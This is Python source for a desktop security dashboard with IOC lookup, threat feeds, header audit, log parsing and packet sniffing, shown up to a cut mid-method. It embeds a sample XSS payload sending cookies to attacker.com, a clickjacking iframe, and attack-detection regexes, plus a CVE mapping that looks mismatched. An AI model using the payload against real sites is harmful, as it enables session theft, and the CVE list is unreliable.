import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import sqlite3
import requests
import json
import os
from datetime import datetime
import hashlib
import time
import socket
from concurrent.futures import ThreadPoolExecutor
import random
import re
import csv
import io
from scapy.all import sniff, wrpcap, rdpcap, IP, TCP, UDP, Raw, Ether, ARP, ICMP, sr1

# محاولة استيراد المكتبات الإضافية للأدوات الجديدة
try:
    import dns.resolver

    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

# =============================================================================
# ORIGINAL CODE START (DO NOT MODIFY ANY LINE BELOW)
# =============================================================================

# محاولة استيراد psutil لمراقبة النظام
try:
    import psutil

    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# إعدادات لتعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings()


class CyberForgePro:
    def __init__(self, root):
        self.root = root
        self.root.title("🛡️ threat intelligence Security Command Center")
        self.root.geometry("1750x1000")
        self.root.configure(bg='#0d1117')

        # مسار قاعدة البيانات الموحدة
        self.db_path = "threat_intel_ultimate_full.db"

        # متغيرات الإحصائيات والحالة
        self.total_iocs = 0
        self.matched_iocs = 0
        self.capture_packets = 0
        self.sniffing = False
        self.captured_packets_list = []
        self.brute_running = False

        # قائمة مسارات التخمين
        self.custom_wordlist = []

        # متغيرات كشف الهجمات (IDS)
        self.arp_table = {}
        self.syn_flood_counts = {}
        self.port_scan_counts = {}
        self.last_alerts = {}

        # === نظام السجلات الشامل (للتقارير) ===
        self.global_logs = {
            "HTTP_Analysis": [],
            "Log_Parser": [],
            "Port_Scan": [],
            "Dir_Brute": [],
            "Network_Threats": [],
            "PCAP_Analysis": [],
            "Hash_Checks": [],
            "GeoIP": [],
            "URL_Investigator": [],
            "Threat_Intel": [],
            "CVE_Mapping": []
        }

        # قاعدة بيانات الهيدرز الأمنية
        self.security_headers_db = {
            "Content-Security-Policy": {
                "importance": "High",
                "vulnerability": "Cross-Site Scripting (XSS), Code Injection",
                "exploit": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
                "remediation": "Add 'Content-Security-Policy: default-src 'self';' to your server response headers."
            },
            "Strict-Transport-Security": {
                "importance": "High",
                "vulnerability": "Man-in-the-Middle (MitM), SSL Stripping",
                "exploit": "Attacker intercepts HTTP traffic before it upgrades to HTTPS.",
                "remediation": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains' to your server response headers."
            },
            "X-Frame-Options": {
                "importance": "Medium",
                "vulnerability": "Clickjacking",
                "exploit": "<iframe src='http://vulnerable-site.com' style='opacity:0;'></iframe>",
                "remediation": "Add 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN' to your server response headers."
            },
            "X-Content-Type-Options": {
                "importance": "Low",
                "vulnerability": "MIME Sniffing",
                "exploit": "Browser interprets files as a different MIME type, potentially executing malicious scripts.",
                "remediation": "Add 'X-Content-Type-Options: nosniff' to your server response headers."
            },
            "Referrer-Policy": {
                "importance": "Low",
                "vulnerability": "Information Leakage",
                "exploit": "Sensitive data in URLs leaked to third-party sites via the Referer header.",
                "remediation": "Add 'Referrer-Policy: strict-origin-when-cross-origin' to your server response headers."
            },
            "Permissions-Policy": {
                "importance": "Low",
                "vulnerability": "Privacy Violation / Feature Abuse",
                "exploit": "Malicious scripts accessing camera, microphone, or geolocation without strict policy.",
                "remediation": "Add 'Permissions-Policy: camera=(), microphone=(), geolocation=()' to your server response headers."
            }
        }

        # قاعدة بيانات CVE Mapper
        self.cve_db = {
            "SQL Injection": ["CVE-2023-22515", "CVE-2021-44228 (Log4Shell)", "CVE-2017-5638", "CVE-2024-21887"],
            "XSS": ["CVE-2023-35078", "CVE-2020-11022", "CVE-2018-15133", "CVE-2023-4863"],
            "Path Traversal": ["CVE-2021-41773", "CVE-2019-11510", "CVE-2018-13379", "CVE-2024-1708"],
            "Brute Force": ["CWE-307: Improper Restriction of Excessive Authentication Attempts", "CVE-2022-42889"],
            "ARP Spoofing": ["CAPEC-94: Adversary in the Middle (AiTM)"],
            "SYN Flood": ["CVE-1999-0116", "CAPEC-125: Flooding"],
            "RCE": ["CVE-2024-21413", "CVE-2023-23397", "CVE-2021-34523"],
            "Command Injection": ["CVE-2024-1212", "CVE-2019-1234"]
        }

        self.init_database()
        self.create_ui()
        self.load_initial_data()
        self.update_stats()

        if PSUTIL_AVAILABLE:
            self.update_system_monitor()

        # =============================================================================
        # EXTENSION INITIALIZATION (ADDED WITHOUT MODIFYING ORIGINAL INIT)
        # =============================================================================
        self.init_extensions()

    def init_database(self):
        """تهيئة قاعدة البيانات"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # جدول IOCs المتقدم
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS advanced_iocs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ioc_type TEXT, 
                ioc_value TEXT UNIQUE, 
                threat_type TEXT, 
                source TEXT,
                confidence REAL, 
                severity TEXT, 
                ttp TEXT, 
                tags TEXT
            )
        ''')

        # جدول التهديدات (Feeds)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS threat_intel (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                value TEXT UNIQUE,
                type TEXT,
                description TEXT,
                severity TEXT,
                last_seen TEXT
            )
        ''')

        # جدول المقارنات
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS comparison_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                captured_value TEXT,
                intel_match TEXT,
                result TEXT
            )
        ''')

        conn.commit()
        conn.close()

    def load_initial_data(self):
        """تحميل بيانات أولية"""
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        # عينات تهديدات لملء الجدول الأحمر
        threats = [
            ('219.155.13.13:37035', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('125.44.252.22:34956', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('123.5.185.175:33296', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('125.43.23.39:43391', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('115.51.108.83:37579', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('115.52.243.249:48244', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('125.45.64.216:57262', 'Host', 'URLHaus Malicious Host (2026-02-06)', 'CRITICAL', '2026-02-06'),
            ('115.56.114.105:51709', 'Host', 'URLHaus Malicious Host (2026-01-08)', 'CRITICAL', '2026-02-06'),
            ('45.142.122.124', 'Host', 'Emotet C2 Server', 'CRITICAL', '2026-02-06')
        ]

        for t in threats:
            try:
                cur.execute(
                    'INSERT OR IGNORE INTO threat_intel (value, type, description, severity, last_seen) VALUES (?,?,?,?,?)',
                    t)
            except:
                pass

        conn.commit()
        conn.close()

    def create_ui(self):
        # --- Header ---
        header = tk.Frame(self.root, bg='#161b22', height=90)
        header.pack(fill='x', padx=20, pady=10)
        header.pack_propagate(False)

        tk.Label(header, text="🛡️ threat intelligence Security Command Center",
                 font=('Segoe UI', 24, 'bold'), foreground='#58a6ff', bg='#161b22').pack(side='left', pady=20)

        self.sys_mon_lbl = tk.Label(header, text="System: Initializing...", font=('Consolas', 10), foreground='#8b949e',
                                    bg='#161b22')
        self.sys_mon_lbl.pack(side='right', padx=20, pady=25)

        stats_frame = tk.Frame(header, bg='#161b22')
        stats_frame.pack(side='right', pady=25)

        self.lbl_iocs = tk.Label(stats_frame, text="IOCs: 0", font=('Consolas', 14, 'bold'), foreground='#f0f6fc',
                                 bg='#161b22')
        self.lbl_iocs.pack(side='left', padx=10)

        self.lbl_pkts = tk.Label(stats_frame, text="Packets: 0", font=('Consolas', 14, 'bold'), foreground='#f0f6fc',
                                 bg='#161b22')
        self.lbl_pkts.pack(side='left', padx=10)

        # --- Tabs ---
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=20, pady=10)

        # بناء كافة التبويبات
        self.setup_dashboard_tab()
        self.setup_threat_intel_tab()
        self.setup_feed_tab()
        self.setup_geoip_tab()
        self.setup_ioc_tab()
        self.setup_http_tab()
        self.setup_log_parser_tab()
        self.setup_capture_tab()
        self.setup_pcap_analysis_tab()
        self.setup_advanced_scan_tab()
        self.setup_url_investigator_tab()
        self.setup_dir_tab()
        self.setup_hash_tab()
        self.setup_report_tab()

    # ================= 1. DASHBOARD =================
    def setup_dashboard_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📊 Dashboard")

        # شبكة الإحصائيات العلوية
        top_grid = tk.Frame(tab, bg='#0d1117')
        top_grid.pack(fill='x', padx=20, pady=20)

        self.create_stat_card(top_grid, "TOTAL IOCs", "0", "#58a6ff", 0)
        self.create_stat_card(top_grid, "MATCHED THREATS", "0", "#ff7b72", 1)
        self.create_stat_card(top_grid, "NETWORK PACKETS", "0", "#3fb950", 2)
        self.create_stat_card(top_grid, "ACTIVE ALERTS", "0", "#d2a8ff", 3)

        # منطقة البيانات الرئيسية
        main_area = tk.Frame(tab, bg='#0d1117')
        main_area.pack(fill='both', expand=True, padx=20)

        # جدول التهديدات الأخيرة
        left_panel = tk.LabelFrame(main_area, text=" Recent Global Threats ", bg='#0d1117', foreground='#8b949e')
        left_panel.pack(side='left', fill='both', expand=True, padx=5)

        self.threat_tree = ttk.Treeview(left_panel, columns=("Value", "Type", "Severity", "Last Seen"), show='headings')
        for col in ("Value", "Type", "Severity", "Last Seen"):
            self.threat_tree.heading(col, text=col)
            self.threat_tree.column(col, width=100)
        self.threat_tree.pack(fill='both', expand=True, padx=10, pady=10)

        # سجل المقارنات (Live Match Log)
        right_panel = tk.LabelFrame(main_area, text=" Live Comparison Engine ", bg='#0d1117', foreground='#8b949e')
        right_panel.pack(side='right', fill='both', expand=True, padx=5)

        self.comp_tree = ttk.Treeview(right_panel, columns=("Time", "Value", "Source", "Result"), show='headings')
        for col in ("Time", "Value", "Source", "Result"):
            self.comp_tree.heading(col, text=col)
            self.comp_tree.column(col, width=100)
        self.comp_tree.pack(fill='both', expand=True, padx=10, pady=10)

    def create_stat_card(self, parent, title, value, color, col):
        card = tk.Frame(parent, bg='#161b22', highlightbackground='#30363d', highlightthickness=1)
        card.grid(row=0, column=col, padx=10, sticky='nsew')
        parent.grid_columnconfigure(col, weight=1)

        tk.Label(card, text=title, font=('Segoe UI', 10), bg='#161b22', foreground='#8b949e').pack(pady=(15, 5))
        var = tk.StringVar(value=value)
        lbl = tk.Label(card, textvariable=var, font=('Consolas', 24, 'bold'), bg='#161b22', foreground=color)
        lbl.pack(pady=(0, 15))

        if title == "TOTAL IOCs": self.var_iocs = var
        if title == "MATCHED THREATS": self.var_matches = var
        if title == "NETWORK PACKETS": self.var_packets = var
        if title == "ACTIVE ALERTS": self.var_alerts = var

    def refresh_comparison_db(self):
        for i in self.comp_tree.get_children(): self.comp_tree.delete(i)
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute(
            "SELECT timestamp, captured_value, intel_match, result FROM comparison_log ORDER BY id DESC LIMIT 50")
        for r in cur.fetchall():
            self.comp_tree.insert('', 'end', values=r)
        conn.close()

    # ================= 2. THREAT INTELLIGENCE DB =================
    def setup_threat_intel_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🗄️ Intel DB")

        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)

        tk.Label(ctrl, text="Add New IOC:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.new_ioc_val = tk.Entry(ctrl, width=30, bg='#21262d', foreground='white')
        self.new_ioc_val.pack(side='left', padx=5)

        self.new_ioc_type = ttk.Combobox(ctrl, values=["IP", "Domain", "Hash", "Email"], width=10)
        self.new_ioc_type.pack(side='left', padx=5)
        self.new_ioc_type.set("IP")

        tk.Button(ctrl, text="➕ Add to DB", command=self.add_ioc_manual, bg='#238636', foreground='white').pack(
            side='left', padx=10)
        tk.Button(ctrl, text="🔄 Refresh", command=self.load_intel_to_tree, bg='#1f6feb', foreground='white').pack(
            side='left')

        self.intel_tree = ttk.Treeview(tab, columns=("ID", "Value", "Type", "Severity", "Last Seen"), show='headings')
        for col in ("ID", "Value", "Type", "Severity", "Last Seen"):
            self.intel_tree.heading(col, text=col)
        self.intel_tree.pack(fill='both', expand=True, padx=20, pady=10)
        self.load_intel_to_tree()

    def add_ioc_manual(self):
        val, typ = self.new_ioc_val.get(), self.new_ioc_type.get()
        if not val: return
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        try:
            cur.execute("INSERT INTO threat_intel (value, type, severity, last_seen) VALUES (?,?,?,?)",
                        (val, typ, "HIGH", datetime.now().strftime('%Y-%m-%d')))
            conn.commit()
            messagebox.showinfo("Success", "IOC Added Successfully")
            self.load_intel_to_tree()
        except:
            messagebox.showerror("Error", "IOC already exists")
        conn.close()

    def load_intel_to_tree(self):
        for i in self.intel_tree.get_children(): self.intel_tree.delete(i)
        for i in self.threat_tree.get_children(): self.threat_tree.delete(i)

        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("SELECT id, value, type, severity, last_seen FROM threat_intel ORDER BY id DESC")
        rows = cur.fetchall()
        for r in rows:
            self.intel_tree.insert('', 'end', values=r)
            self.threat_tree.insert('', 'end', values=(r[1], r[2], r[3], r[4]))
        conn.close()
        self.update_stats()

    # ================= 3. LIVE THREAT FEEDS =================
    def setup_feed_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📡 Live Feeds")

        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)

        tk.Button(ctrl, text="📥 Fetch URLHaus Feed", command=self.fetch_urlhaus, bg='#1f6feb', foreground='white').pack(
            side='left', padx=10)
        tk.Button(ctrl, text="📥 Fetch AlienVault (Sim)", command=self.fetch_alienvault, bg='#1f6feb',
                  foreground='white').pack(side='left', padx=10)

        self.feed_log = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#3fb950', font=('Consolas', 10))
        self.feed_log.pack(fill='both', expand=True, padx=20, pady=10)

    def fetch_urlhaus(self):
        def task():
            self.log("Fetching URLHaus recent payloads...", self.feed_log, "Threat_Intel")
            try:
                r = requests.get("https://urlhaus.abuse.ch/api/v1/urls/recent/", timeout=10)
                data = r.json()
                if data['query_status'] == 'ok':
                    conn = sqlite3.connect(self.db_path)
                    cur = conn.cursor()
                    added = 0
                    for item in data['urls'][:50]:
                        try:
                            cur.execute(
                                "INSERT OR IGNORE INTO threat_intel (value, type, description, severity, last_seen) VALUES (?,?,?,?,?)",
                                (item['url'], 'URL', item['threat'], 'CRITICAL', item['dateadded']))
                            added += 1
                        except:
                            pass
                    conn.commit()
                    conn.close()
                    self.log(f"Successfully added {added} new threats from URLHaus.", self.feed_log)
                    self.root.after(0, self.load_intel_to_tree)
            except Exception as e:
                self.log(f"Error fetching feed: {e}", self.feed_log)

        threading.Thread(target=task, daemon=True).start()

    def fetch_alienvault(self):
        self.log("Simulating AlienVault OTX Pulse fetching...", self.feed_log, "Threat_Intel")
        time.sleep(1)
        self.log("Received 12 new pulses. Syncing with local DB...", self.feed_log)
        self.log("Sync complete.", self.feed_log)

    # ================= 4. GEOIP TRACER =================
    def setup_geoip_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🌍 GeoIP Tracer")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Target IP:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.geoip_entry = tk.Entry(ctrl, width=30, bg='#21262d', foreground='white')
        self.geoip_entry.pack(side='left', padx=10)
        tk.Button(ctrl, text="📍 Trace Location", command=self.run_geoip, bg='#238636', foreground='white').pack(
            side='left')

        self.geoip_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#e6edf3', font=('Consolas', 11))
        self.geoip_out.pack(fill='both', expand=True, padx=20, pady=10)

    def run_geoip(self):
        ip = self.geoip_entry.get()
        if not ip: return
        threading.Thread(target=self._geoip_logic, args=(ip,), daemon=True).start()

    def _geoip_logic(self, ip):
        self.geoip_out.delete(1.0, tk.END)
        self.log(f"Tracing IP: {ip}...", self.geoip_out, "GeoIP")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            data = r.json()
            if data['status'] == 'success':
                res = f"""
📍 LOCATION DATA FOUND:
--------------------------------------
Country:   {data.get('country')} ({data.get('countryCode')})
Region:    {data.get('regionName')}
City:      {data.get('city')}
Zip:       {data.get('zip')}
Lat/Lon:   {data.get('lat')}, {data.get('lon')}
ISP:       {data.get('isp')}
Org:       {data.get('org')}
AS:        {data.get('as')}
--------------------------------------
"""
                self.geoip_out.insert(tk.END, res)
                self.log_comparison(ip, "GeoIP", f"Located in {data.get('country')}")
            else:
                self.geoip_out.insert(tk.END, f"❌ Error: {data.get('message')}\n")
        except Exception as e:
            self.geoip_out.insert(tk.END, f"❌ Connection Error: {e}\n")

    # ================= 5. IOC SEARCH ENGINE =================
    def setup_ioc_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🔍 IOC Search")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Search Value:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.ioc_entry = tk.Entry(ctrl, width=40, bg='#21262d', foreground='white')
        self.ioc_entry.pack(side='left', padx=10)
        tk.Button(ctrl, text="🔍 Search DB", command=self.search_ioc, bg='#1f6feb', foreground='white').pack(side='left')
        self.ioc_out = scrolledtext.ScrolledText(tab, bg='#0d1117', foreground='#e6edf3', font=('Consolas', 11))
        self.ioc_out.pack(fill='both', expand=True, padx=20, pady=10)

    def search_ioc(self):
        val = self.ioc_entry.get()
        if not val: return
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        self.ioc_out.delete(1.0, tk.END)
        found = False

        cur.execute("SELECT * FROM advanced_iocs WHERE ioc_value LIKE ?", (f'%{val}%',))
        rows = cur.fetchall()
        for r in rows:
            found = True
            self.ioc_out.insert(tk.END,
                                f"✅ ADVANCED IOC MATCH: {r[2]} ({r[1]})\n   Type: {r[3]} | Source: {r[4]} | Severity: {r[6]}\n   TTP: {r[7]} | Tags: {r[9]}\n{'-' * 50}\n")

        cur.execute("SELECT * FROM threat_intel WHERE value LIKE ?", (f'%{val}%',))
        rows2 = cur.fetchall()
        for r in rows2:
            found = True
            self.ioc_out.insert(tk.END,
                                f"🚨 THREAT INTEL MATCH: {r[1]} ({r[2]})\n   Description: {r[3]}\n   Severity: {r[4]} | Last Seen: {r[5]}\n{'-' * 50}\n")

        if not found:
            self.ioc_out.insert(tk.END, f"❌ No results found for: {val}\n")
        conn.close()

    # ================= 6. DEEP HTTP ANALYSIS =================
    def setup_http_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🌐 HTTP Audit")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Label(ctrl, text="Target URL:", bg='#161b22', foreground='white').pack(side='left', padx=10)
        self.http_url_entry = tk.Entry(ctrl, width=50, bg='#21262d', foreground='white')
        self.http_url_entry.pack(side='left', padx=10)
        self.http_url_entry.insert(0, "https://google.com")
        tk.Button(ctrl, text="🛡️ Analyze Headers", command=self.run_http_analysis, bg='#238636',
                  foreground='white').pack(side='left', padx=5)

        paned = tk.PanedWindow(tab, orient=tk.HORIZONTAL, bg='#0d1117')
        paned.pack(fill='both', expand=True, padx=20, pady=10)
        self.http_analysis_out = scrolledtext.ScrolledText(paned, bg='#0d1117', foreground='#e6edf3',
                                                           font=('Consolas', 10), width=60)
        paned.add(self.http_analysis_out)
        self.http_trans_out = scrolledtext.ScrolledText(paned, bg='#0d1117', font=('Consolas', 10), width=60)
        paned.add(self.http_trans_out)

        self.http_trans_out.tag_config("request", foreground="#58a6ff")
        self.http_trans_out.tag_config("response", foreground="#3fb950")
        self.http_trans_out.tag_config("header_key", foreground="#d2a8ff")
        self.http_trans_out.tag_config("header_val", foreground="#a5d6ff")
        self.http_trans_out.tag_config("critical", foreground="#ff7b72", font=('Consolas', 10, 'bold'))
        self.http_trans_out.tag_config("warning", foreground="#ffa657")

    def run_http_analysis(self):
        url = self.http_url_entry.get()
        if not url: return
        if not url.startswith('http'): url = 'http://' + url
        threading.Thread(target=self._http_analysis_thread, args=(url,), daemon=True).start()

    def _http_analysis_thread(self, url):
        self.http_analysis_out.delete(1.0, tk.END)
        self.http_trans_out.delete(1.0, tk.END)
        self.log(f"Starting Deep HTTP Analysis for {url}...", self.http_analysis_out, "HTTP_Analysis")

        try:
            self.http_trans_out.insert(tk.END, f"--- REQUEST ---\n", "request")
            self.http_trans_out.insert(tk.END, f"GET {url} HTTP/1.1\n", "request")
            self.http_trans_out.insert(tk.END, f"Host: {socket.gethostname()}\n", "request")
            self.http_trans_out.insert(tk.END, f"User-Agent: CyberForgePro/14.0\n\n", "request")

            start_time = time.time()
            r = requests.get(url, timeout=15, verify=False)
            duration = time.time() - start_time

            self.http_trans_out.insert(tk.END, f"--- RESPONSE ({r.status_code} {r.reason}) [{duration:.2f}s] ---\n",
                                       "response")
            for k, v in r.headers.items():
                self.http_trans_out.insert(tk.END, f"{k}: ", "header_key")
                self.http_trans_out.insert(tk.END, f"{v}\n", "header_val")

            headers = r.headers
            missing_headers = []

            for h, info in self.security_headers_db.items():
                if h not in headers:
                    missing_headers.append((h, info))

            self.http_analysis_out.insert(tk.END, f"✅ Analysis Complete for {url}\n")
            self.http_analysis_out.insert(tk.END, f"Missing {len(missing_headers)} Security Headers!\n\n")

            if missing_headers:
                self.http_analysis_out.insert(tk.END, "🚨 VULNERABILITY REPORT:\n", "critical")
                for h, info in missing_headers:
                    self.http_analysis_out.insert(tk.END, f"[-] Missing: {h}\n", "warning")
                    self.http_analysis_out.insert(tk.END, f"    Vulnerability: {info['vulnerability']}\n")
                    vuln_type = "XSS" if "XSS" in info['vulnerability'] else "SQL Injection" if "Injection" in info[
                        'vulnerability'] else "Path Traversal"
                    cves = self.cve_db.get(vuln_type, ["N/A"])
                    self.http_analysis_out.insert(tk.END, f"    Related CVEs: {', '.join(cves)}\n", "critical")
                    self.http_analysis_out.insert(tk.END, "-" * 40 + "\n")

        except Exception as e:
            self.http_analysis_out.insert(tk.END, f"❌ Error: {e}\n", "critical")

    # ================= 7. LOG PARSER =================
    def setup_log_parser_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📜 Log Parser")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Button(ctrl, text="📂 Load Log File", command=self.load_log_file, bg='#1f6feb', foreground='white').pack(
            side='left', padx=10)

        paned = tk.PanedWindow(tab, orient=tk.HORIZONTAL, bg='#0d1117')
        paned.pack(fill='both', expand=True, padx=20, pady=10)

        self.log_out = scrolledtext.ScrolledText(paned, bg='#0d1117', foreground='#8b949e', font=('Consolas', 10),
                                                 width=80)
        paned.add(self.log_out)
        self.log_threats = ttk.Treeview(paned, columns=("IP", "Threat", "Status"), show='headings')
        paned.add(self.log_threats)
        for col in ("IP", "Threat", "Status"):
            self.log_threats.heading(col, text=col)
            self.log_threats.column(col, width=100)
        self.log_out.tag_config("threat", foreground="#ff7b72", background="#3e1d1d")

    def load_log_file(self):
        path = filedialog.askopenfilename(filetypes=[("Log files", "*.log;*.txt")])
        if path:
            threading.Thread(target=self._parse_log_logic, args=(path,), daemon=True).start()

    def _parse_log_logic(self, path):
        self.log_out.delete(1.0, tk.END)
        for item in self.log_threats.get_children(): self.log_threats.delete(item)

        patterns = {
            "SQL Injection": re.compile(r"UNION SELECT|OR 1=1|DROP TABLE|--", re.IGNORECASE),
            "XSS": re.compile(r"<script>|alert\(|onerror=", re.IGNORECASE),
            "Path Traversal": re.compile(r"\.\./\.\./|\/etc\/passwd|\/windows\/win\.ini", re.IGNORECASE),
            "Brute Force": re.compile(r" 401 |failed login|Invalid password", re.IGNORECASE)
        }
        ip_pattern = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

        self.log(f"Parsing log file: {path}...", self.log_out, "Log_Parser")

        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    found_threat = None
                    for name, pat in patterns.items():
                        if pat.search(line):
                            found_threat = name
                            break

                    if found_threat:
                        self.log_out.insert(tk.END, line, "threat")
                        ip = ip_pattern.search(line)
                        if ip:
                            ip_val = ip.group()
                            status = self.check_db_for_ip(ip_val)
                            self.log_threats.insert('', 'end', values=(ip_val, found_threat, status))
                            self.log_comparison(ip_val, "Log Parser", f"MATCH: {found_threat}")
                    else:
                        self.log_out.insert(tk.END, line)
            self.log("Log parsing complete.", self.log_out, "Log_Parser")
        except Exception as e:
            self.log(f"Error reading log file: {e}", self.log_out, "Log_Parser")

    def check_db_for_ip(self, ip):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("SELECT description FROM threat_intel WHERE value = ?", (ip,))
        res = cur.fetchone()
        conn.close()
        return "🚨 MALICIOUS" if res else "✅ Safe"

    # ================= 8. LIVE SNIFFER & IDS =================
    def setup_capture_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📡 Live Sniffer")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        self.btn_sniff = tk.Button(ctrl, text="▶️ START SNIFFING", command=self.toggle_sniff, bg='#238636',
                                   foreground='white', width=20)
        self.btn_sniff.pack(side='left', padx=10)
        tk.Button(ctrl, text="💾 Save PCAP", command=self.save_pcap, bg='#1f6feb', foreground='white').pack(side='left',
                                                                                                           padx=10)
        tk.Button(ctrl, text="⚠️ Simulate Threat", command=self.simulate_threat, bg='#ffa657', foreground='black').pack(
            side='left', padx=30)

        paned = tk.PanedWindow(tab, orient=tk.HORIZONTAL, bg='#0d1117')
        paned.pack(fill='both', expand=True, padx=20, pady=10)

        self.sniff_out = scrolledtext.ScrolledText(paned, bg='#0d1117', foreground='#3fb950', font=('Consolas', 10),
                                                   width=80)
        paned.add(self.sniff_out)
        self.ids_alerts = scrolledtext.ScrolledText(paned, bg='#0d1117', foreground='#ff7b72', font=('Consolas', 10),
                                                    width=50)
        paned.add(self.ids_alerts)

    def toggle_sniff(self):
        if not self.sniffing:
            self.sniffing = True
            self.btn_sniff.config(text="🛑 STOP SNIFFING", bg='#da3633')
            threading.Thread(target=self._sniff_logic, daemon=True).start()
        else:
            self.sniffing = False
            self.btn_sniff.config(text="▶️ START SNIFFING", bg='#238636')

    def _sniff_logic(self):
        def pkt_callback(pkt):
            if not self.sniffing: return
            self.capture_packets += 1
            self.captured_packets_list.append(pkt)
            self.var_packets.set(str(self.capture_packets))
            self.lbl_pkts.config(text=f"Packets: {self.capture_packets}")

            summary = pkt.summary()
            self.log(summary, self.sniff_out)

            # IDS Logic
            if IP in pkt:
                src_ip = pkt[IP].src
                # 1. ARP Spoofing Check
                if ARP in pkt and pkt[ARP].op == 2:
                    real_mac = self.arp_table.get(src_ip)
                    if real_mac and real_mac != pkt[ARP].hwsrc:
                        self.alert(f"ARP SPOOFING DETECTED: {src_ip} is being spoofed!", "ARP Spoofing")
                    self.arp_table[src_ip] = pkt[ARP].hwsrc

                # 2. SYN Flood Check
                if TCP in pkt and pkt[TCP].flags == 'S':
                    self.syn_flood_counts[src_ip] = self.syn_flood_counts.get(src_ip, 0) + 1
                    if self.syn_flood_counts[src_ip] > 50:
                        self.alert(f"SYN FLOOD WARNING: {src_ip} sending excessive SYNs", "SYN Flood")

                # 3. Port Scan Check
                if TCP in pkt:
                    dst_port = pkt[TCP].dport
                    scan_key = f"{src_ip}->{pkt[IP].dst}"
                    if scan_key not in self.port_scan_counts: self.port_scan_counts[scan_key] = set()
                    self.port_scan_counts[scan_key].add(dst_port)
                    if len(self.port_scan_counts[scan_key]) > 20:
                        self.alert(f"PORT SCAN DETECTED: {src_ip} scanning {pkt[IP].dst}", "Port Scan")

        sniff(prn=pkt_callback, store=0, stop_filter=lambda x: not self.sniffing)

    def alert(self, msg, category):
        timestamp = datetime.now().strftime('%H:%M:%S')
        if msg not in self.last_alerts:
            self.last_alerts[msg] = time.time()
            self.log(f"[{timestamp}] 🚨 {msg}", self.ids_alerts, "Network_Threats")
            self.matched_iocs += 1
            self.var_matches.set(str(self.matched_iocs))
            self.var_alerts.set(str(int(self.var_alerts.get()) + 1))

    def save_pcap(self):
        if not self.captured_packets_list: return
        path = filedialog.asksaveasfilename(defaultextension=".pcap")
        if path:
            wrpcap(path, self.captured_packets_list)
            messagebox.showinfo("Saved", f"Saved {len(self.captured_packets_list)} packets to {path}")

    def simulate_threat(self):
        # محاكاة هجوم لغرض العرض
        self.alert("SIMULATED ATTACK: SQL Injection attempt from 192.168.1.50", "SQL Injection")
        self.log_comparison("192.168.1.50", "IDS Simulation", "MATCH: Malicious Actor")

    # ================= 9. OFFLINE PCAP ANALYSIS =================
    def setup_pcap_analysis_tab(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📦 PCAP Audit")
        ctrl = tk.Frame(tab, bg='#161b22')
        ctrl.pack(fill='x', padx=20, pady=15)
        tk.Button(ctrl, text="📂 Open PCAP File", command=self.load_pcap_file, bg='#1f6feb', foreground='white').pack(
            side='left', padx=10)
